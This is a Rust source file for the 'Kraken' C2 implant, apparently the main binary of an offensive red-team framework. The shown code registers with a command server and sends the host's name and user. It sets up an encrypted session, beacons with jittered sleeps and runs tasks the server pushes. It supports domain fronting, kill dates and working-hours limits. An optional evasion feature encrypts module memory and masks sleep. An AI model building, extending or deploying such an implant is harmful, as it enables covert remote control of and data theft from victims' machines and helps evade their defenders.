//! Kraken Implant - Real implant binary
//!
//! This is the actual implant that runs on target systems.
//! Uses TransportChain for resilient communication.

use common::{ImplantId, KrakenError, Transport};
use config::{ImplantConfig, ProfileConfig, TransportType};
use crypto::{ImplantCrypto, X25519PublicKey};
use protocol::{
    decode, encode, CheckIn, CheckInResponse, ImplantRegistration, MessageEnvelope, MessageType,
    ProtocolVersion, RegistrationResponse, Task, TaskResponse, Timestamp, Uuid,
};
use chrono::{Datelike, Timelike};
use std::time::Duration;
use tracing::{debug, error, info, warn};

mod error;
mod evasion;
mod registry;
mod runtime;
mod sysinfo;
mod tasks;
mod transport;

use runtime::ImplantRuntime;
use transport::{HttpTransport, TransportChain};

// ============================================================================
// Configuration - In production this would be baked at compile time
// ============================================================================

fn get_config() -> ImplantConfig {
    // For testing: read from env or use defaults
    let server_url = std::env::var("KRAKEN_SERVER")
        .unwrap_or_else(|_| "http://localhost:8080".to_string())
        .trim()
        .to_string();

    ImplantConfig {
        server_public_key: String::new(), // Will be set from server's static key
        transports: vec![config::TransportConfig {
            transport_type: TransportType::Http,
            address: server_url,
            cert_pin: None,
            proxy: None,
            dns: None,
            domain_front_host: None,
        }],
        profile: ProfileConfig::default(),
        checkin_interval: 10, // 10 seconds for testing (would be 60+ in production)
        jitter_percent: 20,
        max_retries: 10,
        kill_date: 0,
        working_hours: None,
    }
}

// For testing: use a known server public key or generate one
fn get_server_public_key() -> X25519PublicKey {
    // In production: this would be baked at compile time
    // For testing: we use the server's test key
    if let Ok(hex_key) = std::env::var("KRAKEN_SERVER_PUBKEY") {
        if hex_key.len() == 64 {
            let mut bytes = [0u8; 32];
            if hex::decode_to_slice(&hex_key, &mut bytes).is_ok() {
                return X25519PublicKey(bytes);
            }
        }
    }

    // Fallback: generate a test key (won't work with real server)
    warn!("Using generated test key - set KRAKEN_SERVER_PUBKEY for real server");
    let (pub_key, _) = crypto::x25519::generate_keypair().expect("keygen failed");
    pub_key
}

// ============================================================================
// Implant State
// ============================================================================

struct Implant {
    config: ImplantConfig,
    transport: TransportChain,
    crypto: ImplantCrypto,
    implant_id: Option<ImplantId>,
    runtime: ImplantRuntime,
    pending_responses: Vec<TaskResponse>,
    should_exit: bool,
}

impl Implant {
    fn new() -> Result<Self, KrakenError> {
        let config = get_config();
        let server_pub_key = get_server_public_key();

        // Build transport chain
        let transports: Vec<Box<dyn Transport>> = config
            .transports
            .iter()
            .map(|t| {
                let transport: Box<dyn Transport> = match t.domain_front_host.clone() {
                    Some(front_host) => Box::new(HttpTransport::new_with_fronting(
                        &t.address,
                        config.profile.clone(),
                        front_host,
                    )),
                    None => Box::new(HttpTransport::new(&t.address, config.profile.clone())),
                };
                transport
            })
            .collect();

        let transport = TransportChain::new(transports);
        let crypto = ImplantCrypto::new(server_pub_key);
        let runtime = ImplantRuntime::new();

        Ok(Self {
            config,
            transport,
            crypto,
            implant_id: None,
            runtime,
            pending_responses: Vec::new(),
            should_exit: false,
        })
    }

    /// Register with the C2 server
    fn register(&mut self) -> Result<(), KrakenError> {
        info!("starting registration");

        // Generate ephemeral keypair
        let (ephemeral_pub, ephemeral_priv) = self.crypto.generate_keypair()?;

        // Collect system info
        let system_info = sysinfo::gather();
        debug!(
            "system info: hostname={}, user={}",
            system_info.hostname, system_info.username
        );

        // Build registration message
        let registration = ImplantRegistration {
            ephemeral_public_key: ephemeral_pub.as_bytes().to_vec(),
            system_info: Some(system_info),
            protocol_version: Some(ProtocolVersion {
                major: 1,
                minor: 0,
                patch: 0,
            }),
            config_hash: Vec::new(),
        };

        // Wrap in envelope
        let envelope = MessageEnvelope {
            message_type: MessageType::Registration as i32,
            payload: encode(&registration),
        };

        // Send via transport chain
        let response_bytes = self.transport.exchange(&encode(&envelope))?;

        // Parse response
        let reg_response: RegistrationResponse = decode(&response_bytes)
            .map_err(|e| KrakenError::protocol(format!("decode failed: {}", e)))?;

        // Extract implant ID
        let implant_id = reg_response
            .implant_id
            .as_ref()
            .ok_or_else(|| KrakenError::protocol("missing implant_id"))?;

        let id = ImplantId::from_bytes(&implant_id.value)
            .map_err(|e| KrakenError::protocol(format!("invalid implant_id: {}", e)))?;

        info!("received implant_id: {}", id);

        // Key exchange with server's ephemeral public key
        let server_ephemeral_pub = X25519PublicKey::from_bytes(&reg_response.server_public_key)
            .map_err(|e| KrakenError::crypto(format!("invalid server key: {}", e)))?;

        let shared_secret = self
            .crypto
            .key_exchange(&ephemeral_priv, &server_ephemeral_pub)?;
        self.crypto.derive_session_key(&shared_secret)?;

        self.implant_id = Some(id);
        info!("registration successful, session established");

        Ok(())
    }

    /// Check in with the server
    fn checkin(&mut self) -> Result<Vec<Task>, KrakenError> {
        let implant_id = self
            .implant_id
            .ok_or_else(|| KrakenError::InvalidState("not registered".into()))?;

        debug!(
            "checking in with {} pending responses",
            self.pending_responses.len()
        );

        // Build check-in message
        let checkin = CheckIn {
            implant_id: Some(Uuid {
                value: implant_id.as_bytes().to_vec(),
            }),
            local_time: Some(Timestamp::now()),
            task_responses: std::mem::take(&mut self.pending_responses),
            loaded_modules: Vec::new(),
        };

        // Encrypt with session key
        let plaintext = encode(&checkin);
        let encrypted = self.crypto.encrypt_message(&plaintext, implant_id)?;

        // Wrap in envelope (server expects all messages in MessageEnvelope)
        let envelope = MessageEnvelope {
            message_type: MessageType::Checkin as i32,
            payload: encrypted,
        };

        // Send via transport
        let response_bytes = self.transport.exchange(&encode(&envelope))?;

        // Decrypt response
        let decrypted = self.crypto.decrypt_message(&response_bytes)?;

        // Parse response
        let checkin_response: CheckInResponse = decode(&decrypted)
            .map_err(|e| KrakenError::protocol(format!("decode failed: {}", e)))?;

        let task_count = checkin_response.tasks.len();
        if task_count > 0 {
            info!("received {} tasks", task_count);
        }

        Ok(checkin_response.tasks)
    }

    /// Execute a task and queue the response
    async fn execute_task(&mut self, task: Task) {
        let task_id = task
            .task_id
            .as_ref()
            .map(|u| hex::encode(&u.value))
            .unwrap_or_else(|| "unknown".to_string());

        info!("executing task {} (type: {})", task_id, task.task_type);

        // Check for exit task
        if task.task_type == "exit" {
            info!("received exit task");
            self.should_exit = true;
        }

        // Handle sleep task (special case - modifies implant config directly)
        if task.task_type == "sleep" {
            match self.execute_sleep_task(&task) {
                Ok(response) => self.pending_responses.push(response),
                Err(e) => {
                    error!("sleep task failed: {}", e);
                    // Push error response
                    let response = TaskResponse {
                        task_id: task.task_id.clone(),
                        status: protocol::TaskStatus::Failed as i32,
                        result: Some(protocol::task_response::Result::Error(
                            protocol::TaskError {
                                code: -1,
                                message: format!("sleep task failed: {}", e),
                                details: None,
                            },
                        )),
                        completed_at: Some(Timestamp::now()),
                    };
                    self.pending_responses.push(response);
                }
            }
            return;
        }

        // Execute and queue response
        let response = self.runtime.execute_task(&task).await;
        self.pending_responses.push(response);
    }

    /// Execute sleep task to update check-in config
    fn execute_sleep_task(&mut self, task: &Task) -> Result<TaskResponse, KrakenError> {
        use protocol::{SleepTask, SleepResult, task_response::Result as TaskResult, TaskSuccess, TaskStatus};

        let sleep_task: SleepTask = decode(&task.task_data)
            .map_err(|e| KrakenError::protocol(format!("decode sleep task: {}", e)))?;

        // Record old values
        let old_interval = self.config.checkin_interval;
        let old_jitter = self.config.jitter_percent;

        // Apply new values (only if provided and valid)
        if sleep_task.interval > 0 {
            self.config.checkin_interval = sleep_task.interval;
        }
        if sleep_task.jitter <= 100 {
            self.config.jitter_percent = sleep_task.jitter;
        }

        info!(
            "sleep config updated: {}s/{}% -> {}s/{}%",
            old_interval, old_jitter,
            self.config.checkin_interval, self.config.jitter_percent
        );

        // Build result
        let result = SleepResult {
            old_interval,
            old_jitter,
            new_interval: self.config.checkin_interval,
            new_jitter: self.config.jitter_percent,
        };

        Ok(TaskResponse {
            task_id: task.task_id.clone(),
            status: TaskStatus::Completed as i32,
            result: Some(TaskResult::Success(TaskSuccess {
                result_data: encode(&result),
            })),
            completed_at: Some(Timestamp::now()),
        })
    }

    /// Calculate sleep duration with Gaussian jitter (Box-Muller transform)
    fn jittered_interval(&self) -> Duration {
        let base_ms = self.config.checkin_interval as u64 * 1000;
        let jitter_pct = self.config.jitter_percent;
        Duration::from_millis(gaussian_jitter(base_ms, jitter_pct))
    }

    /// Main implant loop
    async fn run(&mut self) -> Result<(), KrakenError> {
        info!("implant starting");

        // Register first
        self.register()?;

        // Main loop
        while !self.should_exit {
            // Kill date check
            if self.config.kill_date > 0 {
                let now = std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap_or_default()
                    .as_secs();
                if now >= self.config.kill_date {
                    warn!("kill date reached, shutting down");
                    break;
                }
            }

            // Working hours check
            if let Some(ref wh) = self.config.working_hours {
                let now_local = chrono::Local::now();
                let weekday = now_local.weekday().num_days_from_sunday() as u8;
                let hour = now_local.hour() as u8;
                if !wh.days.contains(&weekday) || hour < wh.start_hour || hour >= wh.end_hour {
                    let poll = std::time::Duration::from_secs(60);
                    tokio::task::spawn_blocking(move || std::thread::sleep(poll))
                        .await
                        .ok();
                    continue;
                }
            }

            // Sleep with jitter
            // Note: Use spawn_blocking + std::thread::sleep for Windows cross-compilation
            // compatibility. tokio::time::sleep can hang on cross-compiled Windows binaries.
            let sleep_duration = self.jittered_interval();
            debug!("sleeping for {}s", sleep_duration.as_secs());

            // Before sleep: encrypt module memory
            #[cfg(feature = "evasion-sleep")]
            unsafe { crate::evasion::module_encrypt::encrypt_modules(); }

            // Sleep (use masked sleep when available)
            #[cfg(feature = "evasion-sleep")]
            unsafe { crate::evasion::sleep_mask::masked_sleep(sleep_duration.as_millis() as u32); }
            #[cfg(not(feature = "evasion-sleep"))]
            {
                let sleep_dur = sleep_duration;
                tokio::task::spawn_blocking(move || std::thread::sleep(sleep_dur)).await.ok();
            }

            // After sleep: decrypt module memory
            #[cfg(feature = "evasion-sleep")]
            unsafe { crate::evasion::module_encrypt::decrypt_modules(); }

            // Check in
            match self.checkin() {
                Ok(tasks) => {
                    for task in tasks {
                        self.execute_task(task).await;
                    }
                }
                Err(e) => {
                    error!("check-in failed: {}", e);
                    // Transport chain handles failover internally
                }
            }
        }

        // Final check-in to report exit
        info!("sending final check-in before exit");
        let _ = self.checkin();

        info!("implant exiting");
        Ok(())
    }
}

// ============================================================================
// Helpers
// ============================================================================

/// Gaussian jitter via Box-Muller transform.
///
/// Returns a sleep duration in milliseconds drawn from a normal distribution
/// with mean `base_ms` and sigma = `jitter_percent`% of `base_ms`, clamped
/// to [base/2, base*2] to avoid extreme outliers.
fn gaussian_jitter(base_ms: u64, jitter_percent: u32) -> u64 {
    if jitter_percent == 0 {
        return base_ms;
    }

    let u1: f64 = rand::random::<f64>().max(1e-10);
    let u2: f64 = rand::random::<f64>();
    let z = (-2.0 * u1.ln()).sqrt() * (2.0 * std::f64::consts::PI * u2).cos();

    let sigma = base_ms as f64 * (jitter_percent as f64 / 100.0);
    let jittered = base_ms as f64 + z * sigma;

    jittered
        .max(base_ms as f64 * 0.5)
        .min(base_ms as f64 * 2.0) as u64
}

// ============================================================================
// Entry Point
// ============================================================================

#[tokio::main]
async fn main() {
    // Initialize logging
    tracing_subscriber::fmt()
        .with_env_filter(
            tracing_subscriber::EnvFilter::from_default_env()
                .add_directive("implant=info".parse().unwrap()),
        )
        .init();

    info!("Kraken implant starting");
    info!(
        "server: {}",
        std::env::var("KRAKEN_SERVER").unwrap_or_else(|_| "http://localhost:8080".to_string())
    );

    // Create and run implant
    let mut implant = match Implant::new() {
        Ok(i) => i,
        Err(e) => {
            error!("failed to initialize implant: {}", e);
            return;
        }
    };

    if let Err(e) = implant.run().await {
        error!("implant error: {}", e);
    }
}
